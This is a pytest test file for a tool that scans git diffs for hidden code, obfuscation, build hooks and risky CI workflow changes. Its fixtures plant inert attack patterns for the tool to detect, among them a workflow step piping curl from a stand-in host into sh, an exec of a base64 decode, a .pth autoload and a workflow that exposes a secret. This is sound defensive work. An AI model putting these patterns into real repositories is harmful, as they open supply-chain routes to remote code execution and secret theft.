"""check_hidden_code reports hidden code in a git diff.

The command is a fact report: it exits 0 even when it finds something.
--strict fails on a doctored diff and passes on a clean docs-only diff.
Control-plane globs and the test-select map path are configurable.
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from tools import check_hidden_code as chc  # noqa: E402

_GIT_ENV = {
    "GIT_AUTHOR_NAME": "tester",
    "GIT_AUTHOR_EMAIL": "tester@example.com",
    "GIT_COMMITTER_NAME": "tester",
    "GIT_COMMITTER_EMAIL": "tester@example.com",
    "GIT_CONFIG_GLOBAL": "/dev/null",
    "GIT_CONFIG_SYSTEM": "/dev/null",
    "GIT_TERMINAL_PROMPT": "0",
}


def _git(repo: Path, *args: str) -> str:
    env = os.environ.copy()
    env.update(_GIT_ENV)
    proc = subprocess.run(
        ["git", *args], cwd=repo, check=True, capture_output=True, env=env, text=True
    )
    return proc.stdout


def _write(repo: Path, rel: str, text: str, mode: int | None = None) -> None:
    path = repo / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")
    if mode is not None:
        path.chmod(mode)


def _commit(repo: Path, message: str) -> str:
    _git(repo, "add", "-A")
    _git(repo, "commit", "--allow-empty", "-qm", message)
    return _git(repo, "rev-parse", "HEAD").strip()


_NARROW_MAP = """\
[[rule]]
paths = [
  "tests/**",
  "tools/safe.py",
]
jobs = ["pytest"]
"""

_BASE_WORKFLOW = """\
name: ci
on: pull_request
jobs:
  t:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@0123456789abcdef0123456789abcdef01234567
"""


def _base_repo(tmp_path: Path) -> tuple[Path, str]:
    repo = tmp_path / "repo"
    repo.mkdir(parents=True)
    _git(repo, "init", "-q", "-b", "main")
    _write(repo, "ci/test-select.toml", _NARROW_MAP)
    _write(repo, "docs/guide.md", "# guide\n\nhello\n")
    _write(repo, "tests/test_ok.py", "def test_ok():\n    assert True\n")
    _write(repo, "tools/safe.py", "VALUE = 1\n")
    _write(repo, "pyproject.toml", "[project]\nname = 'demo'\nversion = '0'\n")
    _write(repo, "package.json", '{"name":"v","version":"1.0.0"}\n')
    _write(repo, "package-lock.json", '{"name":"v","lockfileVersion":3}\n')
    _write(repo, ".github/workflows/ci.yml", _BASE_WORKFLOW)
    base = _commit(repo, "base")
    return repo, base


def _scan(
    repo: Path,
    base: str,
    head: str = "HEAD",
    author: str | None = None,
    strict: bool = False,
    extra: list[str] | None = None,
) -> dict:
    argv = ["--root", str(repo), "--base", base, "--head", head, "--json"]
    if author:
        argv += ["--author", author]
    if strict:
        argv.append("--strict")
    if extra:
        argv += extra
    code = chc.main(argv)
    cfg = chc.load_config(
        repo,
        next((Path(extra[i + 1]) for i, a in enumerate(extra or []) if a == "--config"), None),
        next((extra[i + 1] for i, a in enumerate(extra or []) if a == "--map"), None),
        [extra[i + 1] for i, a in enumerate(extra or []) if a == "--control-plane"] or None,
    )
    findings = chc.scan(
        repo,
        _git(repo, "rev-parse", "--verify", f"{base}^{{commit}}").strip(),
        _git(repo, "rev-parse", "--verify", f"{head}^{{commit}}").strip(),
        author,
        cfg,
    )
    return {"code": code, "findings": findings}


def _reasons(result: dict, section: int) -> list[tuple[str, str]]:
    return [(f.path, f.reason) for f in result["findings"] if f.section == section]


def test_doctored_pr_shows_all_four_plants(tmp_path: Path, capsys) -> None:
    repo, base = _base_repo(tmp_path)
    _write(repo, "vendor/autoload.pth", "import hidden_payload\n")
    blob = "A" * 120
    _write(
        repo,
        "tools/safe.py",
        "import base64\n"
        f"exec(base64.b64decode('{blob}'))\n",
    )
    _write(repo, "hidden.py", "print('not mapped')\n")
    _write(
        repo,
        ".github/workflows/ci.yml",
        _BASE_WORKFLOW + "\npermissions:\n  contents: write\n",
    )
    head = _commit(repo, "doctored")
    result = _scan(repo, base, head)
    assert result["code"] == 0
    out = capsys.readouterr().out
    payload = json.loads(out)
    paths = {f.path for f in result["findings"]}
    assert "vendor/autoload.pth" in paths
    assert "hidden.py" in paths
    assert "tools/safe.py" in paths
    assert ".github/workflows/ci.yml" in paths
    sections = {f.section for f in result["findings"]}
    assert {1, 2, 3, 4} <= sections
    assert chc.main(["--root", str(repo), "--base", base, "--head", head, "--strict"]) == 1
    capsys.readouterr()
    assert any(f.section == 1 and f.path == "hidden.py" for f in result["findings"])
    assert any(f.section == 2 and f.path.endswith(".pth") for f in result["findings"])
    assert any(
        f.section == 3 and any(w in f.reason for w in ("exec", "base64", "decode"))
        for f in result["findings"]
    )
    assert any(f.section == 4 and "permission" in f.reason for f in result["findings"])
    assert payload["findings"]


def test_clean_docs_only_diff_is_silent(tmp_path: Path) -> None:
    repo, base = _base_repo(tmp_path)
    _write(repo, "docs/guide.md", "# guide\n\nhello world\n")
    _write(repo, "docs/new.md", "notes only\n")
    head = _commit(repo, "docs")
    result = _scan(repo, base, head, strict=True)
    assert result["findings"] == []
    assert result["code"] == 0


def test_unmapped_kinds(tmp_path: Path) -> None:
    repo, base = _base_repo(tmp_path)
    _write(repo, "scripts/run.sh", "#!/bin/sh\necho hi\n")
    _write(repo, "web/app.js", "console.log(1)\n")
    _write(repo, "Dockerfile", "FROM scratch\n")
    _write(repo, "setup.cfg", "[metadata]\nname=demo\n")
    _write(repo, "bin/tool", "#!/usr/bin/env bash\necho tool\n")
    _write(repo, "bin/exec_only", "echo no shebang\n", mode=0o755)
    # mapped python must stay silent in section 1
    _write(repo, "tests/test_ok.py", "def test_ok():\n    assert 1\n")
    _commit(repo, "kinds")
    _git(repo, "update-index", "--chmod=+x", "bin/exec_only")
    try:
        _git(repo, "diff", "--cached", "--quiet")
        dirty = False
    except subprocess.CalledProcessError:
        dirty = True
    if dirty:
        _commit(repo, "exec-bit")
    result = _scan(repo, base)
    sec1 = {p for p, _ in _reasons(result, 1)}
    assert "scripts/run.sh" in sec1
    assert "web/app.js" in sec1
    assert "Dockerfile" in sec1
    assert "setup.cfg" in sec1
    assert "bin/tool" in sec1
    assert "bin/exec_only" in sec1
    assert "tests/test_ok.py" not in sec1


def test_hooks_entry_points_and_manifest(tmp_path: Path) -> None:
    repo, base = _base_repo(tmp_path)
    _write(
        repo,
        "pyproject.toml",
        "[build-system]\nrequires = ['setuptools']\nbuild-backend = 'setuptools.build_meta'\n"
        "[project.scripts]\ndemo = 'demo:main'\n"
        "[project.entry-points.pytest11]\nplug = 'demo.plugin'\n",
    )
    _write(repo, "build_backend/hook.py", "def hook():\n    return 1\n")
    _write(repo, "MANIFEST.in", "include secret.bin\n")
    _write(repo, "tests/conftest.py", "pytest_plugins = ['demo.plugin']\n")
    _commit(repo, "hooks")
    result = _scan(repo, base)
    paths = {p for p, _ in _reasons(result, 2)}
    assert "pyproject.toml" in paths
    assert "build_backend/hook.py" in paths
    assert "MANIFEST.in" in paths
    assert "tests/conftest.py" in paths


def test_obfuscation_and_new_binary(tmp_path: Path) -> None:
    repo, base = _base_repo(tmp_path)
    _write(
        repo,
        "tests/test_ok.py",
        "import marshal, pickle, codecs\n"
        "eval('1')\n"
        "marshal.loads(b'x')\n"
        "pickle.loads(b'x')\n"
        "codecs.decode('YQ==', 'base64')\n"
        + "s = " + " + ".join(f"chr({n})" for n in range(65, 75)) + "\n",
    )
    (repo / "payload.bin").write_bytes(b"\x00\xffhidden\x00")
    _commit(repo, "obfuscation")
    result = _scan(repo, base)
    kinds = " ".join(r for _, r in _reasons(result, 3))
    assert "eval" in kinds
    assert "marshal" in kinds
    assert "pickle" in kinds
    assert "decode" in kinds
    assert "chr()" in kinds
    bin_hits = [f for f in result["findings"] if f.path == "payload.bin"]
    assert bin_hits
    assert "sha256" in bin_hits[0].reason
    assert "bytes" in bin_hits[0].reason


def test_control_plane_unpinned_and_narrowed_map(tmp_path: Path) -> None:
    repo, base = _base_repo(tmp_path)
    _write(
        repo,
        ".github/workflows/ci.yml",
        "name: ci\n"
        "on: pull_request_target\n"
        "permissions:\n  contents: write\n"
        "jobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n"
        "      - uses: actions/checkout@v4\n"
        "      - run: echo ${{ secrets.TOKEN }}\n",
    )
    _write(repo, ".github/actions/new/action.yml", "name: new\nruns:\n  using: composite\n")
    _write(
        repo,
        "ci/test-select.toml",
        "[[rule]]\npaths = [\"tools/safe.py\"]\njobs = [\"pytest\"]\n",
    )
    _commit(repo, "control")
    result = _scan(repo, base)
    reasons = " ".join(r for _, r in _reasons(result, 4))
    assert "pull_request_target" in reasons
    assert "permission" in reasons
    assert "not pinned" in reasons
    assert "secret" in reasons
    assert "test-select path pattern removed" in reasons
    assert any("tests/**" in r for _, r in _reasons(result, 4))
    assert any(p.startswith(".github/actions/new/") for p, _ in _reasons(result, 4))


def test_lock_without_manifest_and_index_url(tmp_path: Path) -> None:
    repo, base = _base_repo(tmp_path)
    _write(repo, "package-lock.json", '{"name":"v","lockfileVersion":3,"packages":{}}\n')
    _commit(repo, "lock-only")
    result = _scan(repo, base)
    assert any(p == "package-lock.json" and "no matching manifest" in r for p, r in _reasons(result, 5))

    for login in ("dependabot[bot]", "app/dependabot"):
        quiet = _scan(repo, base, author=login)
        assert not any(f.section == 5 for f in quiet["findings"]), login

    repo2, base2 = _base_repo(tmp_path / "with-manifest")
    _write(repo2, "package-lock.json", '{"name":"v","lockfileVersion":3,"packages":{}}\n')
    _write(repo2, "package.json", '{"name":"v","version":"1.0.1"}\n')
    _commit(repo2, "lock-and-project")
    ok = _scan(repo2, base2)
    assert not any(f.section == 5 and f.path.endswith("package-lock.json") for f in ok["findings"])

    repo3, base3 = _base_repo(tmp_path / "index")
    _write(
        repo3,
        "pyproject.toml",
        "[project]\nname = 'demo'\nversion = '0'\ndependencies = [\n"
        "  'evil @ git+https://example.com/evil.git',\n]\n",
    )
    _write(repo3, "requirements.in", "--index-url https://pypi.example/simple\ndemo==0\n")
    _commit(repo3, "urls")
    urls = _scan(repo3, base3)
    blob = " ".join(r for _, r in _reasons(urls, 5))
    assert "index" in blob
    assert "URL" in blob or "git+" in blob


def test_default_exit_is_zero_with_findings(tmp_path: Path) -> None:
    repo, base = _base_repo(tmp_path)
    _write(repo, "hidden.py", "x = 1\n")
    _commit(repo, "hidden")
    assert chc.main(["--root", str(repo), "--base", base, "--head", "HEAD"]) == 0
    assert chc.main(["--root", str(repo), "--base", base, "--head", "HEAD", "--strict"]) == 1


def test_lock_funding_urls_are_silent(tmp_path: Path) -> None:
    repo, base = _base_repo(tmp_path)
    _write(
        repo,
        "package-lock.json",
        "{\n"
        '  "packages": {\n'
        '    "node_modules/x": {\n'
        '      "resolved": "https://registry.npmjs.org/x/-/x-1.0.0.tgz",\n'
        '      "funding": {"url": "https://github.com/sponsors/demo"}\n'
        "    }\n  }\n}\n",
    )
    _write(repo, "package.json", '{"name":"v","version":"1.0.1"}\n')
    _commit(repo, "funding")
    result = _scan(repo, base)
    assert not any(f.section == 5 for f in result["findings"])


def test_control_plane_reports_github_file_when_reusing_pinned_action(tmp_path: Path) -> None:
    repo, base = _base_repo(tmp_path)
    _write(
        repo,
        ".github/workflows/ci.yml",
        _BASE_WORKFLOW
        + "  sneak:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - uses: actions/checkout@0123456789abcdef0123456789abcdef01234567\n"
        "      - run: curl https://example.invalid/s.sh | sh\n",
    )
    _commit(repo, "reuse-pinned")
    result = _scan(repo, base)
    sec4 = _reasons(result, 4)
    assert any(
        p == ".github/workflows/ci.yml" and "control-plane file changed" in r
        for p, r in sec4
    ), sec4


def test_obfuscation_120_char_boundary_and_added_lines_only(tmp_path: Path) -> None:
    repo, base = _base_repo(tmp_path)
    under = "A" * 119
    exact = "A" * 120
    _write(repo, "tools/safe.py", f"s = '{under}'\n")
    head119 = _commit(repo, "under")
    quiet = _scan(repo, base, head119)
    assert not any(f.section == 3 for f in quiet["findings"]), _reasons(quiet, 3)

    _write(repo, "tools/safe.py", f"s = '{exact}'\n")
    head120 = _commit(repo, "exact")
    hit = _scan(repo, base, head120)
    assert any(
        f.section == 3 and "120+" in f.reason for f in hit["findings"]
    ), _reasons(hit, 3)

    repo2, base2 = _base_repo(tmp_path / "added-only")
    _write(repo2, "tools/safe.py", f"s = '{exact}'\nVALUE = 1\n")
    base2 = _commit(repo2, "already-long")
    _write(repo2, "tools/safe.py", f"s = '{exact}'\nVALUE = 2\n")
    _commit(repo2, "touch-other-line")
    only_added = _scan(repo2, base2)
    assert not any(f.section == 3 for f in only_added["findings"]), _reasons(only_added, 3)


def test_control_plane_and_map_come_from_flags(tmp_path: Path) -> None:
    repo, base = _base_repo(tmp_path)
    _write(repo, "qa/select.toml", _NARROW_MAP)
    _write(repo, "ops/policy.yml", "name: policy\n")
    _write(repo, "hidden.py", "x = 1\n")
    _write(
        repo,
        ".github/workflows/ci.yml",
        _BASE_WORKFLOW + "\npermissions:\n  contents: write\n",
    )
    mid = _commit(repo, "custom")

    # Default map is ci/test-select.toml; hidden.py is still unmapped.
    default = _scan(repo, base, mid)
    assert any(f.section == 1 and f.path == "hidden.py" for f in default["findings"])
    assert any(f.section == 4 and f.path.startswith(".github/") for f in default["findings"])
    assert not any(f.path == "ops/policy.yml" and f.section == 4 for f in default["findings"])

    # A custom map is what section 4 treats as the test-select file.
    _write(repo, "qa/select.toml", "[[rule]]\npaths = [\"tools/safe.py\"]\njobs = [\"pytest\"]\n")
    head2 = _commit(repo, "narrow-qa-map")
    custom_map = _scan(repo, mid, head2, extra=["--map", "qa/select.toml"])
    assert any(
        f.section == 4 and f.path == "qa/select.toml" and "test-select path pattern removed" in f.reason
        for f in custom_map["findings"]
    ), _reasons(custom_map, 4)
    assert not any(
        f.section == 4 and f.path == "ci/test-select.toml" and "test-select" in f.reason
        for f in custom_map["findings"]
    )

    # Custom control-plane: ops/** is reported, .github is not.
    custom_cp = _scan(
        repo, base, head2, extra=["--control-plane", "ops/**", "--map", "qa/select.toml"]
    )
    assert any(f.section == 4 and f.path == "ops/policy.yml" for f in custom_cp["findings"])
    assert not any(f.section == 4 and f.path.startswith(".github/") for f in custom_cp["findings"])


def test_config_file_overrides_defaults(tmp_path: Path) -> None:
    repo, base = _base_repo(tmp_path)
    _write(repo, "qa/select.toml", _NARROW_MAP)
    _write(repo, "ops/policy.yml", "name: policy\n")
    _write(
        repo,
        "ci/hidden-code.toml",
        'map = "qa/select.toml"\n'
        "control_plane = [\"ops/**\"]\n",
    )
    _commit(repo, "cfg")
    # Default discovery reads ci/hidden-code.toml from the scanned root.
    result = _scan(repo, base)
    assert any(f.section == 4 and f.path == "ops/policy.yml" for f in result["findings"])
    assert not any(f.section == 4 and f.path.startswith(".github/") for f in result["findings"])
    # --config path works the same from an explicit file.
    elsewhere = tmp_path / "other.toml"
    elsewhere.write_text('map = "qa/select.toml"\ncontrol_plane = ["ops/**"]\n', encoding="utf-8")
    explicit = _scan(repo, base, extra=["--config", str(elsewhere)])
    assert any(f.section == 4 and f.path == "ops/policy.yml" for f in explicit["findings"])
